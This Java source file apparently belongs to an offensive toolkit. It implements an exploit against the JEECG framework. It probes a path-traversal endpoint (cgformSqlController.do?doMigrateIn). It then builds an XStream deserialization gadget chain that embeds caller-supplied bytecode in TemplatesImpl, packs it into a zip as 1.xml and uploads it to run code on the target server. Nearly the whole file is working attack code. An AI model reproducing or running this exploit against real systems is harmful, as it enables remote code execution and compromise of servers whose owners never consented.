package com.example.jeecg_tools.exploit;

import cn.hutool.http.HttpResponse;
import cn.hutool.http.Method;
import com.example.jeecg_tools.common.BasePayload;
import com.example.jeecg_tools.entity.Result;

import java.io.*;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class JEECG_XstreamInject implements BasePayload {
    @Override
    public Result checkVUL(String str) throws Exception {
        String payload = str+"/api/../cgformSqlController.do?doMigrateIn";
        try {
            cn.hutool.http.HttpRequest req = new cn.hutool.http.HttpRequest(payload);
            req.method(Method.GET);
            HttpResponse execute = req.execute();
            String reqbody = execute.body();
            if (execute.getStatus()==200){
                return new Result(true,payload, reqbody);
            }
        }catch (Exception e){
            e.printStackTrace();
        }
        return new Result(false,payload,null);
    }

    @Override
    public Result exeVUL(String str, String str2) throws Exception {
        return null;
    }

    @Override
    public Result getShell(String str) throws Exception {
        return null;
    }

    @Override
    public Result fileUpload(String str, String filename, String filecontent) throws Exception {
        return null;
    }

    @Override
    public Result Inject(String url, String xsfilename, String payload) throws Exception {
        byte[] zipBytes;

        String uri = url+"/api/../cgformSqlController.do?doMigrateIn";
        System.out.println("inject");
        String head = "<linked-hash-set>\n" +
                "    <dynamic-proxy>\n" +
                "        <interface>map</interface>\n" +
                "        <handler class='com.sun.corba.se.spi.orbutil.proxy.CompositeInvocationHandlerImpl'>\n" +
                "            <classToInvocationHandler class='linked-hash-map'/>\n" +
                "            <defaultHandler class='sun.tracing.NullProvider'>\n" +
                "                <active>true</active>\n" +
                "                <providerType>java.lang.Object</providerType>\n" +
                "                <probes>\n" +
                "                    <entry>\n" +
                "                        <method>\n" +
                "                            <class>java.lang.Object</class>\n" +
                "                            <name>hashCode</name>\n" +
                "                            <parameter-types/>\n" +
                "                        </method>\n" +
                "                        <sun.tracing.dtrace.DTraceProbe>\n" +
                "                            <proxy class='com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl' serialization='custom'>\n" +
                "                                <com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>\n" +
                "                                    <default>\n" +
                "                                        <__name>Pwnr</__name>\n" +
                "                                        <__bytecodes>\n" +
                "                                             <byte-array>";

        String tail = "</byte-array>\n" +
                "                                        </__bytecodes>\n" +
                "                                        <__transletIndex>-1</__transletIndex>\n" +
                "                                        <__indentNumber>0</__indentNumber>\n" +
                "                                    </default>\n" +
                "                                    <boolean>false</boolean>\n" +
                "                                </com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>\n" +
                "                            </proxy>\n" +
                "                            <implementing__method>\n" +
                "                                <class>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</class>\n" +
                "                                <name>getOutputProperties</name>\n" +
                "                                <parameter-types/>\n" +
                "                            </implementing__method>\n" +
                "                        </sun.tracing.dtrace.DTraceProbe>\n" +
                "                    </entry>\n" +
                "                </probes>\n" +
                "            </defaultHandler>\n" +
                "        </handler>\n" +
                "    </dynamic-proxy>\n" +
                "</linked-hash-set>";

        try {
            String Payload = head+payload+tail;
        // 创建一个字节数组输出流，用于存储ZIP文件内容
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        // 创建ZIP输出流
        ZipOutputStream zipOutputStream = new ZipOutputStream(byteArrayOutputStream);

        // 创建一个XML文件内容
        byte[] xmlBytes = Payload.getBytes();

        // 创建一个ZIP条目（相当于ZIP文件中的一个文件）
        ZipEntry zipEntry = new ZipEntry("1.xml");
        zipOutputStream.putNextEntry(zipEntry);
        // 写入XML文件内容到ZIP条目
        zipOutputStream.write(xmlBytes,0,xmlBytes.length);

        zipOutputStream.closeEntry();
        zipOutputStream.close();
        zipBytes= byteArrayOutputStream.toByteArray();

    }catch(IOException e){
        return new Result(false,"出现错误！", String.valueOf(e));
    }

        try{
            cn.hutool.http.HttpRequest httpRequest = new cn.hutool.http.HttpRequest(uri);
            httpRequest.setMethod(Method.POST);
            httpRequest.form("file",zipBytes,xsfilename);
            HttpResponse rep = httpRequest.execute();

            int startcode  = rep.getStatus();
            String reqbody = rep.body();

            if (startcode==200 && reqbody.contains("converters")){
                return new Result(true,null, null);
            }else{
                return new Result(false,"返回内容：\n\n", reqbody);
            }

        }catch (Exception e){
            e.printStackTrace();
        }
        return null;
    }
}
